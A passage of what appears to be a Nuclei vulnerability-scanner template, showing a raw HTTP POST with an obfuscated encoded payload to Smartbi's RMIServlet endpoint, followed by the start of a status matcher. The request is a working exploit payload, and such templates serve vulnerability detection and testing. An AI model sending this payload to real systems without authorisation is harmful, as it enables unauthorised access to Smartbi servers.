      - |
        POST /smartbi/vision/RMIServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        encode=Vctw6_R-Wp4gRip+hpSzDp4D+/JV/JV/uuf1n/utAR_A1/NT1/utnf1n/utADpSpik/u71/u7Q6Rw6/u7DpSpik/u7uEEE/utnf1nE/u7/u7(6h/u7iyQDp4Rh/u76wk/u7R6/u7Anf1/uu/JT/JT
    matchers-condition: and
    matchers:
      - type: status
